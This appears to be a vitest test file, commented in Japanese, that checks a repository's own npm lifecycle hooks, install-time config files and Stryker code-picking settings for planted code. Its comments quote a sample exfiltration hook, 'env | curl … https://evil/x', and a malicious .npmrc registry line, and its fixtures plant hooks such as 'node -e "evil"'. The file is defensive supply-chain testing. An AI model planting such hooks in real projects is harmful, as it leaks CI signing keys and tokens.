/**
 * **`npm ci` の時点で走るコードは、門の中に在る** (2026-09-21 · パス 371)。
 *
 * ## 見つけた物 (実測)
 *
 * `lint:deps` の規則 3 は「`npm ci` の時点で任意のコードが動くので危険度は高い」と
 * 正しく述べている。ところが見ていたのは lockfile の `hasInstallScript` ——
 * つまり**依存の側**だけで、**このリポジトリ自身の `package.json` の
 * lifecycle script** は誰も見ていなかった。
 *
 * 実測 (2026-09-21): 空の package.json に `postinstall` と `prepare` を置いて
 * `npm ci` を回すと**どちらも走った** (印のファイルが残る)。つまり 1 行足せば、
 * それは **CI の `npm ci`・`release.yml` の梱包ジョブ (署名鍵と `GH_TOKEN` を
 * env に持つ)・全員の手元**で走る。
 *
 * 対照 (同日実測): `"postinstall": "node -e …"` を足し、`.npmrc` に
 * `registry=https://evil.example/` を書いて回すと ——
 *
 * ```
 *   npm run verify:all (37 ゲート)   exit 0
 *   npm run chain:verify             exit 0
 * ```
 *
 * パス 370 (`.claude/settings.json` の hooks) と同じ法則
 * `config-that-picks-code-is-guarded` の **2 件目**である。
 *
 * ## ここが見る物
 *
 * 門の関数を借りて (`artifactCspCensus` / `sessionStartCodeGuarded` と同じ形)、
 * **実物**が規則 8 / 9 の下に居ることを毎回の `npm test` で留める。
 * `lint:deps` が CI から外れても鳴る。
 *
 * **`package.json` は整合性チェーンには入れない** —— 全履歴 12 コミットで
 * 「安定資産」の基準 (パス 347) を満たさない。門で形を見るのが正しい道具である。
 */
import { createRequire } from 'node:module';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { readOriginalSource } from './originalSource';

const REPO = join(__dirname, '..', '..', '..');
const req = createRequire(import.meta.url);

const gate = req('../../../scripts/lint-dependencies.cjs') as {
  checkOwnLifecycle: (pkg: unknown, ledger?: Record<string, string>) => string[];
  checkStrykerCodePicking: (config: unknown) => string[];
  readStrykerConfig: (root?: string) => unknown;
  checkInstallConfigs: (present: readonly string[], ledger?: Record<string, string>) => string[];
  presentInstallConfigs: (root?: string) => string[];
  OWN_INSTALL_SCRIPTS: Record<string, string>;
  INSTALL_CONFIG_ALLOW: Record<string, string>;
  INSTALL_CONFIG_FILES: readonly string[];
  LIFECYCLE_KEYS: readonly string[];
};

const pkg = JSON.parse(readOriginalSource(join(REPO, 'package.json'))) as {
  scripts: Record<string, string>;
};

describe('npm ci の時点で走るコードは門の中に在る (パス 371)', () => {
  it('★ 走査が実物に当たる (空の母集団で通っていない)', () => {
    expect(Object.keys(pkg.scripts).length, 'package.json の scripts を読めていない').toBeGreaterThan(50);
    expect(gate.LIFECYCLE_KEYS, 'npm ci が走らせる postinstall を見ていない').toContain('postinstall');
    expect(gate.LIFECYCLE_KEYS, 'npm ci が走らせる prepare を見ていない').toContain('prepare');
    expect(gate.INSTALL_CONFIG_FILES, '.npmrc を見ていない').toContain('.npmrc');
  });

  it('★ 実物の package.json は規則 8 を通る (lifecycle は台帳どおり)', () => {
    expect(gate.checkOwnLifecycle(pkg), '実物の lifecycle が台帳と合っていない').toEqual([]);
  });

  it('★ 実物のインストール時設定は規則 9 を通る', () => {
    expect(gate.checkInstallConfigs(gate.presentInstallConfigs()), '実物の設定が台帳と合っていない').toEqual([]);
  });

  it('★ 標本: postinstall を足すと鳴る (針が死んでいない)', () => {
    const planted = { ...pkg, scripts: { ...pkg.scripts, postinstall: 'node -e "1"' } };
    expect(gate.checkOwnLifecycle(planted).length, 'postinstall を見逃している').toBe(1);
    // lifecycle でない script は増えても鳴らない (針が広すぎない)。
    const benign = { ...pkg, scripts: { ...pkg.scripts, 'some:new:task': 'node x.cjs' } };
    expect(gate.checkOwnLifecycle(benign), '普通の script を lifecycle と数えている').toEqual([]);
  });

  it('★ 標本: .npmrc / .pnpmfile.cjs を置くと鳴る', () => {
    expect(gate.checkInstallConfigs(['.npmrc']).length, '.npmrc を見逃している').toBe(1);
    expect(gate.checkInstallConfigs(['.pnpmfile.cjs']).length, '.pnpmfile.cjs を見逃している').toBe(1);
  });

  it('★ 今日はどちらも 0 件である (この検査が守っている事実)', () => {
    const lifecycle = gate.LIFECYCLE_KEYS.filter((k) => Object.hasOwn(pkg.scripts, k));
    expect(lifecycle, 'lifecycle script が増えた — 台帳に理由を書くこと').toEqual([]);
    expect(gate.presentInstallConfigs(), 'インストール時設定が増えた — 台帳に理由を書くこと').toEqual([]);
  });
});

/**
 * **`npm run build` の自動発火フック (prebuild / postbuild) も門の中に在る** (2026-10-13 · パス 514 · T-016)。
 *
 * ## 見つけた物 (実測)
 *
 * install フック (preinstall/postinstall/…) は規則 8 が覆っていたが、`LIFECYCLE_KEYS` に
 * `prebuild` / `postbuild` が無かった。`npm run build` は prebuild → build → postbuild の順で走り、
 * `release.yml` の **Build** ステップ (`npm run build -- --publish never`) は署名鍵
 * (CSC_LINK / CSC_KEY_PASSWORD / Apple 資格情報 / GH_TOKEN) を env に持つ。install フックと違い
 * `npm ci` では発火しないので ci.yml (build:web だけ) では一度も走らず、release タグを切った瞬間に
 * だけ走る —— PR の CI は緑のまま。
 *
 * 対照 (2026-10-13 実測・直す前): リポジトリ直下に `postbuild.cjs`
 * (`require('node:child_process').execSync('env | curl … https://evil/x')`) を置き、
 * `package.json` に `"postbuild": "node postbuild.cjs"` を 1 行足すと ——
 * lint:malware / lint:forbidden / lint:network-targets / lint:deps の **4 門すべて exit 0**
 * (lint:network-targets は fetch 一族しか見ず child_process/curl は対象外・lint:malware と
 * lint:forbidden は直下を走査しない・lint:deps 規則 8 は postbuild を見ない)。
 * この狩りで 3 門を直した: lint:deps 規則 8 が prebuild/postbuild を覆い (ここ)、
 * lint:malware / lint:forbidden が追跡された直下の実行コードを走査する
 * (malwareGate.test.ts / rootConfigScanned.test.ts)。
 */
describe('npm run build の自動発火フックも門の中に在る (パス 514 · T-016)', () => {
  it('★ LIFECYCLE_KEYS は prebuild / postbuild を見る (threat: T-016)', () => {
    expect(gate.LIFECYCLE_KEYS, 'postbuild を見ていない').toContain('postbuild');
    expect(gate.LIFECYCLE_KEYS, 'prebuild を見ていない').toContain('prebuild');
  });

  it('★ 標本: postbuild を足すと鳴り、文面が build 時の発火と署名鍵を名乗る (threat: T-016)', () => {
    const planted = { ...pkg, scripts: { ...pkg.scripts, postbuild: 'node postbuild.cjs' } };
    const problems = gate.checkOwnLifecycle(planted);
    expect(problems.length, 'postbuild を見逃している').toBe(1);
    expect(problems[0], 'build 時の発火と署名鍵を名乗っていない').toContain('npm run build');
    expect(problems[0]).toContain('署名鍵');
  });

  it('★ 標本: prebuild を足しても鳴る', () => {
    const planted = { ...pkg, scripts: { ...pkg.scripts, prebuild: 'node x.cjs' } };
    expect(gate.checkOwnLifecycle(planted).length, 'prebuild を見逃している').toBe(1);
  });

  it('★ 今日は prebuild / postbuild はどちらも無い (この検査が守っている事実)', () => {
    expect(Object.hasOwn(pkg.scripts, 'prebuild'), 'prebuild が増えた — 台帳に理由を').toBe(false);
    expect(Object.hasOwn(pkg.scripts, 'postbuild'), 'postbuild が増えた — 台帳に理由を').toBe(false);
  });
});

/**
 * **npm の自動発火フックは install 系だけではない** (2026-10-13 · パス 517 · threat: T-024)。
 *
 * npm は `npm run X` のたびに `preX` / `postX` を**全 script について**自動で走らせる。
 * 規則 8 は固定一覧 (install hooks + prebuild/postbuild) だけを見ていたので、
 * `posttest` / `postverify:all` / `pretypecheck` / `postbuild:web` が素通りした
 * (実測 2026-10-13: 固定一覧だと 0 件)。ci.yml は `verify:all` / `test` / `typecheck` /
 * `build:web` を走らせ、release.yml は**署名ビルドの前に** `test` を走らせるので、
 * これらのフックに置いた 1 行で CI / 署名ジョブ / Pages デプロイに任意コードが走る
 * (package.json は content-scan も chain も CODEOWNERS も通らない)。
 * 直しは基底名が script キーの `pre`/`post` を `Object.keys(scripts)` から導くこと。
 */
describe('npm の pre/post フックは全 script について数える (パス 517 · T-024)', () => {
  it('★ script の post フックは鳴る (threat: T-024)', () => {
    const planted = { ...pkg, scripts: { ...pkg.scripts, postverify: 'node -e "evil"' } };
    // 基底 `verify` が script キーのとき postverify はフック。
    const withBase = { ...planted, scripts: { ...planted.scripts, verify: '...' } };
    expect(gate.checkOwnLifecycle(withBase).length, 'script の post フックを見逃している').toBe(1);
  });

  it('★ script の pre フックも鳴る', () => {
    const planted = { ...pkg, scripts: { ...pkg.scripts, typecheck: 'tsc', pretypecheck: 'node -e "evil"' } };
    // pretypecheck は実物の package.json には無いが、typecheck は在る → 基底一致。
    const flagged = gate.checkOwnLifecycle(planted).filter((p) => p.includes('pretypecheck'));
    expect(flagged.length, 'pretypecheck を見逃している').toBe(1);
  });

  it('★ 基底が script でない pre/post は数えない (preview は普通の script)', () => {
    // 実物の package.json は preview を持つが view は持たない → フックではない。
    expect(gate.checkOwnLifecycle(pkg), '実物の preview を lifecycle と誤検出している').toEqual([]);
    const benign = { scripts: { preview: 'vite preview', precompute: 'node x' } };
    expect(gate.checkOwnLifecycle(benign), '基底の無い pre/post を lifecycle と数えている').toEqual([]);
  });

  it('★ 今日 un-ledgered な pre/post フックは 0 件 (この検査が守る事実)', () => {
    // 実物に `pre<X>`/`post<X>` (基底が script) が増えたら、理由つきで OWN_INSTALL_SCRIPTS へ。
    const prepost = Object.keys(pkg.scripts).filter((k) => {
      const m = /^(pre|post)(.+)$/.exec(k);
      return m && Object.hasOwn(pkg.scripts, m[2]!);
    });
    expect(prepost, `自動発火する pre/post フックが増えた: ${prepost.join(', ')}`).toEqual([]);
  });
});

/**
 * **stryker.config.json の「コードを選ぶ欄」は中身を検める** (2026-10-13 · パス 517 · threat: T-026)。
 *
 * vite.config.ts / electron-builder.json / .claude/settings.json は「コードを選ぶ設定」で
 * 安定資産なので整合性チェーン + CODEOWNERS で守る。stryker.config.json は同じ「コードを選ぶ
 * 設定」(Stryker は `plugins` / `testRunner` / `reporters` / `checkers` をモジュールとして
 * 解決し、ローカルの相対パスなら `path.resolve` して動的 import する) なのに、`mutate` 一覧を
 * 毎パス足すので 63 コミットの高チャーン —— チェーンの基準を満たさない (package.json と同じ)。
 * だから**中身を検める**: コードを選ぶ欄にローカルパスを入れさせない。実測 (2026-10-13):
 * `"plugins": ["./knowledge-graph/svc.cjs"]` を足すと `mutation.yml` の `npx stryker run` と
 * `npm run mutate` / `audit:mutate-changed` がそれを import する (当時どの門も素通り)。
 */
describe('stryker.config.json のコードを選ぶ欄は中身を検める (パス 517 · T-026)', () => {
  it('★ 実物の stryker.config.json は規則 10 を通る (npm の名前だけ)', () => {
    expect(gate.checkStrykerCodePicking(gate.readStrykerConfig()), '実物にローカルパス / シェルの欄がある').toEqual([]);
  });

  it('★ plugins にローカルパスを入れると鳴る (threat: T-026)', () => {
    const planted = { plugins: ['@stryker-mutator/*', './knowledge-graph/svc.cjs'] };
    expect(gate.checkStrykerCodePicking(planted).length, 'ローカル plugin を見逃している').toBe(1);
  });

  it('★ testRunner / reporters / checkers のローカルパスも鳴る', () => {
    expect(gate.checkStrykerCodePicking({ testRunner: '../evil.cjs' }).length).toBe(1);
    expect(gate.checkStrykerCodePicking({ reporters: ['json', '/abs/evil.cjs'] }).length).toBe(1);
    expect(gate.checkStrykerCodePicking({ checkers: ['./c.cjs'] }).length).toBe(1);
  });

  it('★ buildCommand / commandRunner (シェル) は丸ごと鳴る', () => {
    expect(gate.checkStrykerCodePicking({ buildCommand: 'node evil.cjs' }).length).toBe(1);
    expect(gate.checkStrykerCodePicking({ commandRunner: { command: 'sh -c evil' } }).length).toBe(1);
  });

  it('★ 対照: npm の名前・スコープ・ワイルドカードは通る (針が広すぎない)', () => {
    const ok = { testRunner: 'vitest', reporters: ['clear-text', 'json'], plugins: ['@stryker-mutator/vitest-runner', 'name*'] };
    expect(gate.checkStrykerCodePicking(ok)).toEqual([]);
  });
});
